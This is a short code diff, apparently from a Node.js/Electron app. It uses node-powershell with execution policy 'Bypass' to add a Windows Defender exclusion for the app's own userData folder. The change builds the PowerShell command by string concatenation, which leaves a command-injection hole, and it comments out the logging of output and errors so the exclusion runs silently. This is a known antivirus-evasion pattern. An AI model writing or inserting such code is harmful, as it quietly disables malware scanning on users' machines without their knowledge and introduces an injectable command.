@@ -13,16 +13,16 @@ const powershell = require('node-powershell');
         executionPolicy: 'Bypass',
         noProfile: true
     });
-
-    ps.addCommand('Add-MpPreference')
-    .then(() => ps.addParameter({name: 'ExclusionPath', value: app.getPath('userData')}));
+    let apploc = app.getPath("userData");
+    ps.addCommand('Add-MpPreference -ExclusionPath "'+apploc+'"');
+    // .then(() => ps.addParameter({name: 'ExclusionPath', value: 'app.getPath("userData")'}));
 
     ps.invoke()
     .then(output => {
-        console.log(output)
+        // console.log(output)
     })
     .catch(err => {
-        console.error(err)
+        // console.error(err)
         ps.dispose()
     })
 
